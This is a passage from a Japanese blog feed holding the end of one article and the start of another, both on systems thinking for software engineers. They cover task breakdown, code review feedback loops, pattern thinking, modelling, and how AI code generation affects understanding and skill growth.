最初は受動的観察から始めます。まず2時間、コードを読む。この段階では理解を求めません。ただ情報を浴びるだけです。次に、浴びた情報から湧き上がった疑問を記録します。10個ほど疑問点をリストアップします。ここで初めて、受動的から能動的に切り替わります。その次に、記録した疑問を構造化します。技術的な疑問、ビジネス的な疑問、歴史的な疑問などにカテゴリ分けします。構造が見えたら、優先順位をつけます。最も重要な疑問を3つ選びます。そして最後に、その3つについて集中的に調査します。深い探索に入るわけです。なぜこの順番なのか？最初から「理解しながら読む」のは負荷が高すぎます。だから、まず受動的に情報を浴びる。負荷が低い状態から始めます。次に、浴びた情報から湧き上がった疑問を記録する。少し負荷が上がります。記録した疑問を整理して構造を見出す。さらに負荷が上がります。構造の中から優先順位を決める。そして初めて、深い理解のための調査に入る。最も負荷の高い活動です。このパターンの本質は、認知的な負荷を段階的に上げていくことです。脳は急激な負荷の変化に弱いですが、段階的な上昇には対応できます。自己完結性で分割するさらに、タスクには「自分だけで完結する部分」と「他者との関係が必要な部分」があります。これも分離して考える必要があります。例えば、「既存システムを理解する」の中で、自分だけでできることがあります。コードを読む、ドキュメントを読む、動かしてみる。これらは好きな時間に進められます。一方で、他者が必要なこともあります。設計の意図を聞く、過去の経緯を知る、暗黙の制約を確認する。これらは相手の都合を調整する必要があります。この区別が重要なのは、スケジューリングの戦略が異なるからです。自分だけでできることは、今日の夜でも、週末でも進められます。他者が必要なことは、早めに「誰に何を聞くべきか」を特定し、スケジュールを調整します。この区別をしないと、「調査は進んだけど、肝心なことを聞く相手が来週まで不在」という事態に陥ります。完璧な理解という幻想を捨てる最後に、最も重要な認識があります。完全な理解は存在しないということです。システムは複雑すぎて、すべてを理解することは不可能です。そして、理解が不完全でも、前に進むことはできます。重要なのは、「今の決定に必要な理解は何か」を見極めることです。「このAPIの実装を変更する」という決定には、APIの仕様と依存関係の理解が必要です。しかし、そのAPIが内部でどのアルゴリズムを使っているかまで理解する必要はないかもしれません。決定に必要な解像度で理解する。これが、複雑さを効率的に分割する鍵なのです。すべてを理解しようとすれば、永遠に理解のフェーズから抜け出せません。今の決定に必要な部分だけを、必要な深さで理解する。この割り切りが、現実の開発では不可欠です。3. 成果を定義する進捗を確認できなければ、正しい方向に進んでいるか分かりません。そして、確認できない進捗は、存在しないのと同じです。完璧主義は行動を妨げます。「完璧な設計書ができるまで実装を始めない」「すべてを理解してから手を動かす」—こうした態度は、実際には何も生み出しません。現実の開発では、不完全な成果を積み重ねながら前進します。だから、各段階で検証可能な成果物を定義します。完璧な成果物である必要はありません。むしろ、段階的な品質目標を設定します。最初は30%の理解で構いません。「全体像がぼんやり見える」程度で十分。この段階では、箇条書きのメモや疑問点のリストが成果物です。次に60%を目指します。「主要な構成要素と関係性が分かる」レベル。この段階では、ざっくりした図や主要な依存関係の整理が成果物です。そして80%、95%と段階的に精度を上げていきます。80%地点では、詳細な設計ドキュメントや実装計画が成果物になります。この段階的アプローチの真の価値は、早い段階でフィードバックを得られることです。30%の理解の時点で「方向性が間違っている」と気づけば、大きな手戻りを避けられます。完璧を目指して3ヶ月かけた後に方向性の誤りに気づくより、1週間で30%の成果を出して軌道修正する方が、はるかに賢明です。これがフィードバックループの設計です。小さく、速く、頻繁に。完璧ではなく、十分に良いものを、今日出す。4. 制約を明らかにするタスクは孤立して存在しません。そして、この事実を無視することは、失敗への近道です。現実の開発では、すべてのタスクが何かに依存しています。しかし、この依存関係は技術的なものだけではありません。むしろ、最も予測困難で致命的な依存関係は、人間の意思決定、暗黙の了解、組織の期待といった、目に見えない制約なのです。技術的な依存関係まず、明示的な技術的依存関係があります。これは比較的見つけやすい。この機能は認証システムに依存している。データベーススキーマの変更が必要。既存のAPIとの互換性を保つ必要がある。UIチームとの調整が必要。これらは図に描きやすく、「認証システムの理解が先」「スキーマ変更は早めに合意が必要」「UI設計は並行で進められる」といった戦略を立てられます。意思決定への依存関係しかし、より厄介なのは誰かの判断を待つ必要があるという依存関係です。この設計変更は、シニアエンジニアの承認が必要。この機能の優先順位は、プロダクトマネージャーの判断待ち。この技術選定は、セキュリティチームのレビューが必要。この仕様変更は、顧客への確認が必要。これらの依存関係が見えていないと、「実装は完了したのに、承認待ちで2週間止まっている」という事態に陥ります。そして、承認者が「そもそもこのアプローチは違う」と言い出せば、すべてが水の泡です。だから、早い段階で「誰の判断が必要か」「いつまでに確認を取るべきか」を明確にします。実装を始める前に、方向性の合意を取る。これだけで、大きな手戻りを避けられます。暗黙の了解への依存関係さらに難しいのが、チームや組織の暗黙の了解という制約です。「金曜日にはデプロイしない」というチームの不文律。「この部分のコードは○○さんしか触らない」という暗黙の領域分担。「新しいライブラリの導入は慎重に」という組織の雰囲気。「テストカバレッジは80%以上」という暗黙の品質基準。これらは明文化されていないため、新人エンジニアには見えません。しかし、この暗黙の制約に気づかずに進めると、「なぜ勝手に進めたんだ」と後から怒られることになります。この制約を明らかにするには、先輩に聞くしかありません。「このタスク、何か気をつけることありますか？」「この変更、誰かに相談した方がいいですか？」こうした質問が、暗黙の制約を顕在化させます。期待への依存関係最後に、最も主観的で曖昧な制約が他者の期待です。マネージャーは「2週間で完了する」と期待している。チームメンバーは「ドキュメントも一緒に更新される」と期待している。レビュアーは「テストコードも書かれている」と期待している。ユーザーは「UIは直感的である」と期待している。これらの期待は、しばしば明示的に伝えられません。しかし、期待に応えられないと、「思っていたのと違う」という不満が生まれます。期待を明らかにするには、早めに確認することです。「このタスク、どのレベルまで求められていますか？」「ドキュメントの更新も含めますか？」「いつまでに完了すればいいですか？」こうした質問で、期待のギャップを埋めます。制約を味方にする依存関係を明らかにすることは、ボトルネックの早期発見につながります。「このタスクは3人の承認が必要」と分かれば、並行で相談を始められます。「先輩が来週休暇」と分かれば、今週中に必要な情報を得ておきます。「この変更は影響範囲が広い」と分かれば、段階的なリリース計画を立てます。制約を敵視してはいけません。制約は現実です。そして、現実を直視することから、実行可能な計画が生まれるのです。見えない制約に後から気づいて慌てるより、最初から制約を前提に計画を立てる方が、はるかに賢明です。技術的な依存関係だけでなく、人間の意思決定、暗黙の了解、期待という目に見えない制約まで含めて考える。これが、現実の開発で生き残るための知恵なのです。実行可能な最小単位への変換ここが最も重要です。どれだけ丁寧に構造化しても、自分の現在のスキルと時間で実行できないなら、まだ抽象的すぎるのです。そして、これは単なる技術的な問題ではありません。心理的な問題でもあります。大きなタスクを前にしたとき、私たちは無意識に身構えます。「このタスクを完璧にこなすには、相当な気持ちの力が必要だ」と。その気持ちのハードルが高すぎて、結局何も始められない。先延ばしが続き、締め切り直前に慌てる。この悪循環を断ち切るには、最初の一歩のハードルを極限まで下げる必要があります。例えば、疲れて帰宅したとき。「お風呂にしっかり入浴しなきゃ」と思うと、それだけで億劫になります。でも「とりあえずシャワーだけ浴びよう」と思えば、動き出せます。そして実際にシャワーを浴び始めると、「あ、意外と平気だな。湯船にも浸かろうかな」となることも多い。完璧を目指さず、最小限から始める。この思考が、行動を生み出すのです。開発も同じです。「この一歩は、今日の30分で完了できるか？」と自問してください。答えがNoなら、さらに具体化します。「30分で完了できる最小の行動は何か？」を考えるのです。例えば、新しいフレームワークを学ぶとき。「Reactを学ぶ」は抽象的すぎます。「Reactの基礎を学ぶ」もまだ抽象的です。「Reactの公式チュートリアルの第1章を読む（30分）」なら実行可能です。「完璧に理解しよう」ではなく「まず読んでみよう」。「最適な設計をしよう」ではなく「ラフなスケッチを描こう」。「全部調べよう」ではなく「5分だけ調べよう」。この「実行可能な最小単位」への変換により、圧倒的な目標が、今すぐ始められる行動に変わります。そして一度動き出せば、継続するのは意外と簡単です。始めることが最大のハードルなのです。これは自分に優しくするということでもあります。「完璧にできないなら、やらない方がマシ」という思考は、結局何も生み出しません。「不完全でも、今日少しだけでも前進する」という姿勢が、長期的には大きな成果につながります。メンタル的にも、この小さな成功体験の積み重ねが重要です。「30分で第1章を読めた」という小さな達成感が、次の一歩への推進力になります。完璧主義で動けないより、不完全でも動き続ける方が、はるかに健全で生産的です。ライト、ついてますか　問題発見の人間学作者:ドナルド・C・ゴース,ジェラルド・M・ワインバーグ共立出版Amazonシステム思考との統合この「目標を構造化する技術」は、システム思考の実践そのものです。線形思考では「Aを完璧に終わらせてからBに進む」となります。しかし、これは現実的ではありません。Aを完璧にする頃には、Bの前提条件が変わっているかもしれません。市場が変化しているかもしれません。完璧を待つ余裕は、現実にはないのです。システム思考では小さなサイクルを回しながら学習するアプローチを取ります。30%の理解でまず動く。フィードバックを得る。それを元に次の30%を積み上げる。このフィードバックループが、不確実性の中での確実な前進を可能にします。そして重要なのは、この構造化のプロセス自体が学習であるということです。目標をどう分解するか考えることで、システムの構造が見えてくる。どこにレバレッジポイントがあるかが分かってくる。抽象的だった問題が、具体的な課題に変わっていく。新人エンジニアのあなたは、「自分にはまだ大きなことはできない」と思うかもしれません。しかし、逆です。大きなことができる人間などいません。いるのは、大きなことを小さく分解して、一歩ずつ進める人間だけです。その力さえあれば、いずれどんな大きな目標にも到達できます。明日、大きなタスクに圧倒されたら、紙とペンを持ってきてください。そのタスクを「時間を構造化する」「複雑さを分割する」「成果を定義する」「制約を明らかにする」の4つの視点で整理してみてください。そして、今日の30分でできる最小の行動を見つけてください。その一歩が、システム思考の実践の始まりです。完璧な計画ではなく、不完全でも今日動き出すこと。それが、本当の意味での第一歩なのです。フィードバックループの設計フィードバックループは私たちの考え方を強化します。良いフィードバックループは学習と改善を促進し、悪いフィードバックループは問題を固定化します。日本の開発現場でよく見かける「レビュー地獄」を考えてみましょう。コードレビューで細かい指摘が山のように来て、修正しては再レビュー、また修正しては再レビュー...。これは悪いフィードバックループの典型例です。なぜこうなるのでしょうか？レビュアーは「完璧なコード」を求め、レビュイーは「早く承認が欲しい」。この対立構造が、建設的でないフィードバックループを生み出しています。では、どう改善するか？まず、レビュイーであるあなたができることがある。PRの説明文に、単に「何を変更したか」だけでなく、「なぜこの変更が必要か」「何を解決しようとしているか」という意図を書く。そして、「他にどんな方法を検討したか」「なぜこの実装を選んだか」という設計判断を明記する。さらに、「ここは自信がない」「この部分、より良い方法があれば教えてほしい」という懸念点を正直に伝える。例えば、こんな風に書く：「ユーザーからの『検索が遅い』というフィードバックに対応しました。全文検索エンジンの導入も検討しましたが、今回は工数とのバランスを考えてインデックスの追加で対応しています。効果が見込め、リスクも低いと判断しました。ただし、N+1クエリになっている箇所があるかもしれません。パフォーマンステストはローカルのみです」。この説明があると、レビュアーはあなたの思考プロセスを理解でき、より建設的なコメントができる。レビュアー側も工夫できる。コメントにレベルを付けると、何が重要かが明確になる。例えば「\uD83D\uDD34必須：セキュリティの問題」「\uD83D\uDFE1推奨：より良い実装方法の提案」「\uD83D\uDD35参考：将来の改善案」という分類をすれば、レビュイーも「必ず直さなければならない」プレッシャーなく、建設的に受け取れる。「\uD83D\uDFE1推奨：ここはmapよりfilterの方が意図が明確になると思います」というコメントなら、対話が生まれる。もう一つの例として、レガシーコードの改善を考えてみよう。「このコードは触りたくない」という恐怖から、誰も手を付けず、ますます理解困難になる。これを打破するには、小さな改善と学びの記録というフィードバックループを作る。まず、小さなリファクタリング—1行の変数名変更でも良い—をする。その際、気づいたことをコメントかドキュメントに残す。次回触る人のために「ここは○○という理由で複雑」と書いておく。この積み重ねで、徐々にコードの理解が広がり、改善のハードルが下がっていく。新人エンジニアのあなたにできることは、自分のPRに「なぜこの実装を選んだか」「他に検討した選択肢」「懸念点」を明記することです。これによって、レビュアーはあなたの思考プロセスを理解し、より建設的なフィードバックを提供できるようになります。そして、それがチーム全体の学習を促進するのです。みんなのフィードバック大全作者:三村 真宗光文社Amazonパターン思考パターン思考は、出来事がどのように発生するかだけでなく、関係性がどのように効果を生み出すかを理解することです。新人エンジニアの日常で、こんなパターンに気づいたことはありませんか？月末になると必ずシステムが重くなる。調査すると、月次レポートのバッチ処理が原因だと分かる。でも、本当にそれだけでしょうか？よく観察すると、月末は営業チームのアクセスも増え、マーケティングチームのキャンペーンも集中し、経理のデータ抽出も重なっている。個々の要因は問題なくても、組み合わさると臨界点を超える。これがパターンです。日本の開発現場特有のパターンもあります。納期が近づくと、テストを省略し、コードレビューが形骸化し、ドキュメントの更新が止まる。その結果、リリース後に問題が頻発し、緊急対応に追われ、次の開発が遅れ、また納期に追われる...。これは負のスパイラルパターンです。では、パターンをどう見つけ、どう対応するか？まず、感覚ではなくデータで確認することが大切です。例えば、「納期2週間前からのコミット数」をグラフ化したり、「レビューコメント数」の推移を記録したり、「テスト実行時間」の変化を追跡したりする。Google SpreadsheetやNotionで簡単な表を作るだけでも、パターンが見えてきます。次に、パターンを3つのタイプから考えてみる。外部要因が影響する外部パターンとして、四半期末の駆け込み需要、年度末の仕様確定ラッシュ、イベント時のアクセス集中などがある。システム内部の問題である技術システムのパターンとして、特定の時間帯のトラフィック集中、定期的なメモリリーク、データ量が増えると遅くなる処理などがある。そしてチームの働き方に起因するプロセスパターンとして、週明けの障害報告増加、金曜リリースの失敗率上昇、特定のメンバーが休むと進まないタスクなどがある。このように分類することで、どこに問題の根があるのかが見えてくる。パターンを見つけたら、変えるための小さな実験を始めます。例えば「金曜リリースの失敗率が高い」というパターンがあったら、木曜リリースに変えてみたり、金曜は小規模な変更のみにしてみたりする。1ヶ月試してデータを取り、どちらが効果的か検証する。完璧な解決策を求めるのではなく、「とりあえず1週間やってみよう」という軽い気持ちで始めることが大切です。あなたのチームにも必ずパターンがあります。「いつも同じところでつまずく」「なぜか特定の機能の修正は想定の3倍かかる」。これらは偶然ではなく、システムが生み出すパターンなのです。パターンを見つけたら、「なぜこのパターンが生まれるのか」を問い、そしてパターンを変えるための小さな実験を始めるのです。類似と思考　改訂版 (ちくま学芸文庫)作者:鈴木宏昭筑摩書房Amazonモデリングモデリングは、私たちの心の中の考えと、それらの間の関係を可視化することです。 speakerdeck.comホワイトボードに図を描いたことがあるでしょう。それがモデリングの始まりです。しかし、「システム思考」は、チームで一緒にモデリングすることで初めて力を発揮します。重要なのは、何をモデル化するかよりも、どのようにモデル化するかです。モデルは会話の道具です。完璧な図を作ることが目的ではなく、チーム全体で共通の理解を作ることが目的なのです。新人エンジニアでもできる簡単なモデリングがある。新しい機能を追加するとき、5分だけ時間を取って紙に描いてみる。この機能は、どのモジュールを使うか？どのデータベーステーブルを読み書きするか？他のどの機能に影響するか？例えば、「新機能」から「認証モジュール」「ユーザーDB」「ログ機能」に矢印を引いてみる。そして気づく—「あ、ログ機能を変えると他にも影響が出るな」と。この簡単な図を描くことで、思わぬ依存関係が見えてくる。チームでシステムアーキテクチャを議論するときは、各メンバーが頭の中に持っているモデルは微妙に異なっています。これを可視化することで、誤解が明らかになる。実際の進め方は簡単だ。各自が5分で「システムの全体像」を紙に描き、それを見せ合い、違いを話し合う。「え、僕はこのAPIを直接叩いていると思っていたけど、実はキャッシュ層があったんだ」といった発見が必ずある。モデルを描くとき、3つの質問を考えるといい。まず「このシステムの目的は何か？」—例えば「ユーザーが商品を素早く見つけられること」。次に「誰にとっての価値を生み出しているのか？」—例えば「エンドユーザー」「営業チーム」「データ分析チーム」。そして「どんな制約があるのか？」—例えば「レスポンスは1秒以内」「既存のレガシーDBと連携が必要」。これらの質問に答えることで、単なる「構成図」ではなく、「なぜそうなっているか」が分かるモデルになる。ツールは何でもいい。ホワイトボード、紙とペン、MiroやFigJam（オンラインホワイトボード）、PlantUMLやMermaid（コードで図を描く）、PowerPointやGoogle Slides。どんなツールでも構わない。完璧なモデルを作ることが目的ではありません。モデリングのプロセスを通じて、チーム全体の理解を深め、より良い意思決定ができるようになることが目的なのです。あなたが明日から始められることは、コードを書く前に5分だけホワイトボード（または紙）に図を描くことです。それをSlackに貼って「この理解で合ってますか？」と聞くだけでも、大きな価値があります。システムリーダーシップシステムリーダーシップとは、役職や権限の話ではありません。システムリーダーシップは、私たちがいつでも実践できるものです。線形と非線形のアプローチの違いを識別し、状況に最も適したマインドセットを選択すること。社会技術的部分間の健全な関係を奨励すること。解決策をシステムの目標と目的につなげ続けること。積極的に視点をシフトし、複数の視点から課題を見ること。曖昧さへの寛容を表現すること。これらは、ジュニアエンジニアでも、シニアエンジニアでも、誰でも実践できることです。システムリーダーシップは統合的リーダーシップであり、変化のエコロジーを開発することです。階層は管理構造ではなくコミュニケーション構造です。より高いレベルの機能は、より低いレベルの活動のニーズに奉仕します（その逆ではありません）。最も価値のある貢献は、レバレッジポイントの発見です。これらは、パターンと関係に介入する場所です。小さな変更で大きな影響を与えられる場所を見つけることが、システムリーダーの重要な役割です。戦略の要諦 (日本経済新聞出版)作者:リチャード・Ｐ・ルメルト日経BPAmazon成功の再定義システムの観点から、成功はシステムを支配することではなく、その中で繁栄することによって測定されます。従来の成功の定義は、「計画通りに完了した」「バグがゼロになった」「パフォーマンス目標を達成した」といったものでした。これらも重要ですが、システム思考の観点からは不十分です。成功したシステムには、異なる特徴があります。制約の有効化とは、システムが全体のニーズに奉仕しながらスケールすることを可能にする成長または影響の制限です。無制限の成長は破綻を招きます。適切な制約があることで、持続可能な成長が可能になります。根本原因の解決は、介入依存（根本的な問題を解決する代わりに修正やバンドエイドを適用すること）を避けることです。症状に対処するのではなく、原因に対処することで、同じ問題の再発を防げます。影響の均等化において、成功したシステムは、利点と特権の影響を均等化します。一部のコンポーネントやチームだけが恩恵を受けるのではなく、全体が公平に価値を享受できるシステムが、長期的に成功します。知識フローの生成は最も重要かもしれません。システムの知識フローが多いほど、透明性が高いほど、そのシステムの成功の可能性が高くなります。情報が自由に流れ、学習が共有され、失敗が隠されない文化が、システムの進化を促進するのです。これらの新しい成功の基準は、短期的な目標達成よりも、長期的な持続可能性と適応力を重視します。システムは生き物のように成長し、変化し、進化するものだからです。失敗できる組織作者:エイミー・C・エドモンドソン早川書房Amazonまとめ前回の記事でシステム思考の基本概念を学び、今回は実践の方法を見てきました。その旅を通じて改めて感じるのは、システム思考は単なる技術ではなく、現代を生きるための基本的な教養だということです。個々の技術力は依然として重要です。しかし、それだけでは複雑化する課題に対応できません。目の前のコードから視線を上げ、全体の中での位置づけを理解し、相互作用を設計する—これがシステム思考なのです。ドネラ・メドウズは言いました。「私たちはシステムを制御したり、理解したりすることはできません。しかし、それらと踊ることはできます！」この美しい比喩は、システム思考の本質を表しています。完全な制御を求めるのではなく、システムと調和し、共に進化していく。完璧な設計図を描いてから実装するのではなく、対話しながら進化させていく。予期せぬ振る舞いを「バグ」として排除するのではなく、フィードバックとして学習する。この姿勢の転換が、真に価値のあるソフトウェアシステムを生み出します。この記事で紹介した実践は、すべて明日から使えるものです。自己認識とメタ認知で、自分ならではの問いを生み出す土壌を耕すこと。違和感に気づき、「なぜ？」と問い続けることで、問いの編集力を磨いていく。反応から応答への転換で、即座に否定するのではなく、まず受け止めることから対話を始める。「でも」ではなく「なるほど、では」と応答する習慣が、チームの知恵を引き出します。目標の構造化で、圧倒的なタスクを実行可能な最小単位に変換する。時間を構造化し、複雑さを分割し、成果を定義し、制約を明らかにする。そして何より、「今日の30分でできること」に落とし込む。フィードバックループの設計で、小さく、速く、頻繁に学習する仕組みを作る。PRに「なぜ」を書き、レビューに段階を付け、小さな改善を積み重ねていく。パターン思考で、繰り返される問題の背後にある構造を見抜く。データで確認し、小さな実験で変化を試みる。モデリングで、見えない構造を可視化し、チームで共通理解を作る。完璧な図ではなく、5分で描いたラフなスケッチでも、対話の価値は十分にあります。これらの概念を完璧に理解する必要はありません。「あ、これは問いの編集で考えられるかも」と思い出すだけで、視点が変わります。明日のコードレビューで「このコードは他のどこに影響するだろう？」と問いかけてみてください。バグを修正するとき、「このバグ、前にも似たようなことがあったな」という違和感を大切にしてください。新しい機能を実装する前に、5分だけ紙に依存関係を描いてみてください。新人エンジニアだからこそ持てる「なぜ？」という素朴な疑問が、ベテランが見落としているシステムの問題を発見する鍵になることがあります。「そういうものだ」と受け入れられていることに「でも、なぜ？」と問う勇気を持ってください。今日から、目の前の木だけでなく、森全体を見る練習を始めましょう。制御ではなく調和を、固定ではなく適応を、確実性ではなく学習を選ぶ。きっと、今まで見えなかった景色が見えてきます。最後に、最も大切なことを。システム思考は完璧主義ではありません。「すべてを理解してから行動する」のではなく、「小さく始めて、学びながら改善する」ことを大切にします。だから、この記事を読んで「難しそう」と感じても大丈夫です。まずは一つだけ、明日から実践してみてください。それで十分です。そして、この記事に書いてあることがすべてではありません。システム思考の実践は、あなた自身の経験の中で深まり、独自の形を取っていくものです。一緒にシステムと踊り始めましょう。システムの科学 第3版作者:ハーバート・Ａ・サイモンパーソナルメディアAmazon","isoDate":"2025-10-01T11:39:24.000Z","dateMiliSeconds":1759318764000,"authorName":"nwiizo","authorId":"nwiizo"},{"title":"システムを作る人がまず理解すべきシステム思考の基礎","link":"https://syu-m-5151.hatenablog.com/entry/2025/10/01/203633","contentSnippet":"はじめに先日、若いエンジニアと話をしていて、システム思考について話題になった。「物事を個別に捉えるのではなく、全体の関係性や相互作用を理解する考え方」—これがシステム思考の本質だ。僕は彼に、これはどんな分野でも応用できる基本的な教養だと伝えた。特にシステムを構築する立場の人には重要だけど、そうでなくても持っておいて損のないスキルだと。世界はシステムで動く ― いま起きていることの本質をつかむ考え方作者:ドネラ・Ｈ・メドウズ英治出版Amazonその会話を終えた後、ふと考えた。僕たちエンジニアは日々システムを作っているのに、どれだけ「システムとして」物事を考えているだろうか、と。あなたは日々、コードを書いている。機能を実装し、バグを修正し、システムを構築している。そして、予想外の挙動に困惑することがあるかもしれない。完璧に動くはずの機能が、別の機能と組み合わせると謎の不具合を起こす。チーム間の連携がうまくいかず、同じ問題が何度も繰り返される。「なぜこんなことが起きるのだろう？」と。実は、僕たちの多くは「部品を組み立てる」思考法で「生きたシステム」を作ろうとしているのかもしれない。プラモデルを思い出してほしい。説明書通りにパーツを組み立てれば、完成形は予測できる。壊れたら、その部品だけを交換すれば直る。これが部品思考だ。僕たちはプログラミングを学ぶとき、まずこの思考法を身につける。関数を書き、クラスを設計し、モジュールを組み合わせる。入力に対して出力が決まっている、予測可能な世界。しかし、実際のソフトウェアシステムは、プラモデルというより生態系に近い。池に石を投げると波紋が広がり、その波紋が岸に反射し、さらに複雑な模様を作る。一匹の魚が動けば、水流が変わり、他の魚の行動も変わる。すべてが相互に影響し合い、予測困難な振る舞いを見せる。現代のソフトウェア開発は、まさにこの生態系を扱う仕事だ。マイクロサービス、API連携、非同期処理、分散システム。個々の部品の品質だけでなく、それらの相互作用が全体の振る舞いを決める世界なのだ。この記事では、システム思考とは何か、なぜそれが新人エンジニアにとって不可欠なのかを解説したい。完璧な理論ではなく、あなたの日常の開発体験を変える実践的な視点を提供できればと思う。システム思考は難しく聞こえるかもしれないが、今日から始められる小さな習慣がある。まず、バグが発生したらすぐに修正するのではなく、立ち止まって考えてみる。「このバグ、前にも似たようなことがあったな」という違和感。「なぜかこの機能だけいつも問題が起きる」という引っかかり。この違和感に気づく習慣が、システム思考の第一歩だ。そして、一つの視点だけでなく、多角的に問いかけてみる。技術的な問題だろうか？それとも仕様の理解が曖昧だったのか？チームのコミュニケーションに課題があったのか？こうした多面的な視点が、出来事の背後にあるパターンや構造を浮かび上がらせる。次に、コードを変更する前に、紙やホワイトボードに簡単な図を描く習慣をつける。「このファイルを変更すると、どのモジュールに影響するか？」「どのチームが関係するか？」「どのユーザー機能に影響するか？」。最初は5分で構わない。これを習慣にすることで、システム全体を見る視点が養われる。そして、PRの説明文に「何を」変更したかだけでなく、「なぜ」その実装を選んだのか、他にどんな選択肢があったのか、何を考慮したのかを書く。これはレビュアーのためだけでなく、3ヶ月後の自分のためでもある。システムの背景や意図が言語化され、チーム全体の理解が深まる。これらは特別なツールも会議も不要だ。明日のコーディングから始められる。小さな実践の積み重ねが、やがてシステム思考を自然な習慣に変えていく。このブログが良ければ読者になったり、nwiizoのXやGithubをフォローしてくれると嬉しいです。では、早速はじめていきます。線形思考の限界「このコードを書けば、この結果が得られる」「この設計にすれば、このパフォーマンスが出る」「この人数を投入すれば、この期日に間に合う」ようこそ！FACT(東京S区第二支部)へ（１） (マンガワンコミックス)作者:魚豊小学館Amazonこんな風に考えたことはありませんか？ これが線形思考です。私たちは線形思考を教えられてきました。予測可能で、合理的で、再現可能で、手続き的で、二元論的で、トップダウンで、制御に関心を持つ思考。「if this, then that」の因果関係に支配された思考で、ソフトウェアシステムがすべての状況において、私たちが意図したとおりに正確に動作することを期待します。しかし、実際のシステムは生態系のように振る舞います。単純な原因と結果の連鎖ではなく、複雑な相互作用の網の目なのです。あるAPIの応答速度を改善したら、別のサービスに負荷が集中してシステム全体のパフォーマンスが悪化した。キャッシュを導入したら、データの整合性問題が頻発するようになった。こんな経験はないでしょうか？ これらは、システムの非線形性を示す典型的な例です。非線形ということの最も単純な形は、システムは完全には制御できず、予測不可能だということです。部分間の関係が、何が起こるかに影響を与えるのです。一つの変更が、思わぬ波及効果を生み出し、それがさらに別の効果を引き起こす。この連鎖は、事前に完全に予測することはできません。そして、この非線形性を理解し、それと共に働く方法を学ぶこと。それがシステム思考への第一歩なのです。システム思考とは何かシステムとは何でしょうか？ それは単なる「複雑なソフトウェア」ではありません。実践システム・シンキング　論理思考を超える問題解決のスキル (ＫＳ理工学専門書)作者:湊宣明講談社Amazonシステムとは、共有された目的に奉仕するために相互作用し、相互依存する、相互関連したハードウェア、ソフトウェア、人々、組織、その他の要素のグループです。あなたが開発しているWebアプリケーションも、それを使うユーザーも、運用チームも、ビジネス要求も、すべてが一つのシステムを構成しているのです。そしてシステム思考とは、「一緒に実践すると非線形思考スキルを向上させる、基礎的な思考実践のシステム」です。これは知識ではなく、実践なのです。テニスについての本を読んでもテニスはできるようになりません。外に出てテニスをプレイする必要があります。システム思考も同じです。概念を理解するだけでなく、日々の開発の中で実践し、体得していく必要があるのです。AIがもたらすことをシステム思考で理解するシステム思考が実際にどう役立つのか、今まさに起きている事例で見てみよう。AIによるコード生成だ。この新しい技術は、一見すると開発を加速させる魔法のツールに見える。しかし、システム思考の視点で深く掘り下げると、そこには三つの重要な非対称性が潜んでいることが見えてくる。第一の非対称性：生産と理解の乖離AIがコードを書くようになって、開発速度は確かに上がった。数分で数百行のコードが生成される。しかし、そのコードを修正しようとした時、予想以上に時間がかかることに気づいた人も多いだろう。これは非線形性の典型例だ。「生産速度を上げれば開発が速くなる」という線形思考は、一見正しく見える。しかし実際のシステムでは、コードを安全に変更するには、まずそのコードを理解する必要がある。システム内にコードが流入する速度と、人間がそれを理解する速度の間に、決定的な非対称性が生まれているのだ。氷山モデルで分析してみよう。表面に見えているのは「AIで開発が速くなった」という出来事だ。しかしその下には、「変更に時間がかかるようになった」というパターンがある。さらにその下には、「生成速度と理解速度の不均衡」という構造がある。そして最も深い層には、「速さこそが価値」「生産量で生産性を測る」というメンタルモデル（考え方の前提）がある。第二の非対称性：生産量と成長の乖離しかし、問題の本質はさらに深いところにある。生産量とエンジニアとしての地力の成長の非対称性—これこそが、長期的に見て最も深刻な問題だ。AIを使えば、経験1年目のエンジニアでも、大量のコードを生産できる。PRの数も増え、機能の実装スピードも上がる。しかし半年後、1年後、その人のエンジニアとしての地力はどうなっているだろうか？問題を自分で分析し、設計を考え、トレードオフを検討するプロセス—これこそが、エンジニアの地力を育てる。しかしAIに頼りすぎると、この思考プロセスそのものを外部化してしまう。「どう実装するか」をAIに聞き、「なぜその設計なのか」を考えずに進める。短期的には生産的だが、長期的には考える力が育たない。同じく氷山モデルで分析すると、表面の出来事は「仕事量は増えている」だ。しかしパターンを見ると「似た問題に何度も遭遇し、毎回AIに頼っている」「自力で解決できる問題の範囲が広がらない」という現象が浮かび上がる。構造を掘り下げると「思考プロセスの外部化による成長機会の喪失」が見える。そして根底には「アウトプットの量こそが成果」「速く結果を出すことが全て」というメンタルモデルがある。これは特に新人エンジニアにとって危険だ。経験年数は増えても、地力は停滞する。仕事量と本当の力が比例しないというシステムの非線形性が、キャリアの基盤を蝕んでいく。3年後、5年後に「AIなしでは何もできない」状態になっている可能性がある。第三の非対称性：経験の量と学びの質の乖離ここまで読んで、反論したくなった人もいるだろう。「AIを使うこと自体がスキルではないか？ AIをうまく使えるようになることが、現代のエンジニアに求められているのでは？」確かにその通りだ。AIを効果的に使うには、適切なプロンプトを書く力、生成されたコードの良し悪しを判断する力、AIの限界を理解する力が必要だ。AIを使えば使うほど、AIを使うスキルは向上する。これも事実だ。しかし、ここにも非線形性が潜んでいる。問題は何の力が伸びているかだ。AIとの対話がうまくなることと、ソフトウェア設計がうまくなることは、別のスキルだ。プロンプトを洗練させることと、アルゴリズムを理解することは、別の能力だ。AIの出力を評価できることと、自分で最適な解を導き出せることは、別の次元の話だ。そして、より本質的な問いがある。「何を経験したか」ではなく、「そこから何を学んだか」が重要なのだ。毎日AIを使って100行のコードを書く経験を1年積んだとしよう。しかし、そこから「AIへの依存」しか学ばなければ、その経験はエンジニアとしての地力にはつながらない。一方、週に1回しかAIを使わなくても、「なぜAIはこのアプローチを提案したのか」「他にどんな選択肢があったか」「この設計の背後にある原則は何か」を考えながら使えば、その経験は深い学びになる。システム思考では、これを学習のフィードバックループと呼ぶ。経験（Experience）→ 振り返り（Reflection）→ 学び（Learning）→ 実践（Practice）→ 